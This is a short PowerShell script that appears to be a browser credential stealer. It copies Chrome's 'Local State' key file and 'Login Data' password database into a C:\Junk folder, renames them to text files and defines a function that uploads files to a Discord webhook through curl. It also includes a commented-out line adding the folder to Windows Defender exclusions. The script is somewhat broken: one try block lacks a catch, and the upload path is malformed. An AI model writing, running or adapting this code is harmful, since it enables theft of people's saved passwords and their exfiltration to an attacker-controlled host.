# Define the folder path to be created and added to the exclusion list
$folderPath = "C:\Junk"  

# Create the folder
New-Item -ItemType Directory -Path $folderPath -Force

# Add the folder path to the Windows Defender exclusion list
#Add-MpPreference -ExclusionPath $folderPath -Force -ErrorAction Stop

# Define the source paths
$localStatePath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Local State"
$loginDataPath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"

# Copy the folders to the destination without errors and bypassing Windows Defender
try {
    Copy-Item -Path $localStatePath -Destination $folderPath -Recurse -Force -ErrorAction Stop
    Copy-Item -Path $loginDataPath -Destination $folderPath -Recurse -Force -ErrorAction Stop
}
catch {
    Write-Host "An error occurred: $_"
}

# Rename the copied files to state.txt and data.txt
try {
    Rename-Item -Path "$folderPath\Local State" -NewName "$folderPath\state.txt" -Force
    Rename-Item -Path "$folderPath\Login Data" -NewName "$folderPath\data.txt" -Force
}

############################################################################
function Upload-Discord {

[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$file,
    [parameter(Position=1,Mandatory=$False)]
    [string]$text 
)

$hookurl = "$dc"

if (-not ([string]::IsNullOrEmpty($text))){
Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post};

if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
}

if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:TMP\$folderPath"}

pause
